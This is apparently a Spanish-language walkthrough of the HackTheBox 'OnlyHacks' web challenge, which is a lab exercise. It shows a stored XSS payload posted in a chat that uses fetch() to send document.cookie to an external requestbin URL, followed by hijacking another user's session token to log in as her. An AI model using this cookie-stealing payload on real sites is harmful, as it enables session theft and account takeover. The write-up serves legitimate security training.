---
title: "HackTheBox - Challenge OnlyHacks"
summary: "Vamos a ver el paso a paso detallado de como ir resolviendo el challenge:"
date: "2025-04-02"
draft: false
tags:
- Tutorial
- HackTheBox
- Challenge
- Web
---

### Paso a paso:


- Entro a los dos links q me dieron: 
    ![Test Relative Image](./imagen.png)

<div style="height: 5px;"></div>

- Pruebo registrarme con el mail test@email.htb:
    ![Test Relative Image](./imagen2.png)
    
<div style="height: 5px;"></div>

- Nos registramos y nos dan a elegir personas:
    ![Test Relative Image](./imagen3.png)

<div style="height: 5px;"></div>

- Elegimos a las chicas y después vamos a matches:
    ![Test Relative Image](./imagen4.png)

<div style="height: 5px;"></div>

- Probamos un script en el chat:
    ![Test Relative Image](./imagen5.png)

<div style="height: 5px;"></div>

- Utilizo Requestbin whoapi para generar un link que me muestre las maquinas que piden la petición a dicha web:
    ![Test Relative Image](./imagen6.png)

<div style="height: 5px;"></div>

- Después pego el link con un script en el chat de la maquina atacada:
    <pre><code>&lt;script&gt;fetch(&quot;http://requestbin.whapi.cloud/1kxv70s1?cookie=&quot; + document.cookie);&lt;/script&gt;</code></pre>

<div style="height: 5px;"></div>

- Y veo las peticiones:
    ![Test Relative Image](./imagen7.png)

<div style="height: 5px;"></div>

- Mi sesion web token acaba en W-M asiq la otra es la de la web:
    ![Test Relative Image](./imagen8.png)

<div style="height: 5px;"></div>

- En la pagina presiono ctrl + shift + C y voy a la parte de storage y veo mi sesión web token qur es:
    eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImpvYSJ9fQ.Z-7cdA.q-qU-lMHSmBzD4TQRvw4LU8IW-M
    ![Test Relative Image](./imagen9.png)

<div style="height: 5px;"></div>

- Y lo remplazo por el de Renata que me dio en la petición que hizo a la web:
    eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-7buw.346_oMwGAJSQdJA_GQQoNyGfwZQ

<div style="height: 5px;"></div>    

- Y así entro a la web como Renata:
    ![Test Relative Image](./imagen10.png)

<div style="height: 5px;"></div>

- Y ahi encuentro la llave:
    ![Test Relative Image](./imagen11.png)
    

